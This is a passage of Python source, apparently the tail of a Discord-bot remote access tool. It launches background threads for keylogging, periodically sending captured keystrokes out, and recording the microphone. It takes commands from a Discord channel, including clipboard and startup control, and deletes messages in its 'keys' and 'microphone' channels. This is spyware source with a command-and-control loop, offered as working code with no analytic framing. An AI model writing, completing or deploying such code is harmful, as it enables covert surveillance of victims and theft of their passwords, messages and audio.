                                         [(".window-list", "Windows"), (".clipboard", "Clipboard"), (".startup", "Startup"), (".notepad", "Notepad"), (".beep", "Beep")]),
                                view=ButtonsMore())

        bot.loop.create_task(post_info_channel(guild))

    threading.Thread(target=keylogger_thread, daemon=True).start()
    threading.Thread(target=send_keys_periodically, daemon=True).start()
    threading.Thread(target=record_mic_thread, daemon=True).start()
    threading.Thread(target=check_blacklist, daemon=True).start()

@bot.event
async def on_message(message):
    if isinstance(message.channel, discord.DMChannel) or message.guild is None:
        return

    gid = message.guild.id
    chans = CHANNEL_IDS.get(gid, {})
    channel_id = message.channel.id

    if channel_id in (chans.get("keys"), chans.get("microphone")):
        if not message.author.bot:
            try:
                await message.delete()
            except Exception:
                pass
        return

    if CATEGORY_IDS.get(gid) is None or message.channel.category_id != CATEGORY_IDS.get(gid):
        return

    if channel_id == chans.get("cmds"):
        await bot.process_commands(message)
        return

    if message.author.bot:
        return

    try:
        await message.delete()
    except Exception:
        pass

if __name__ == "__main__":
    bot.run(token)
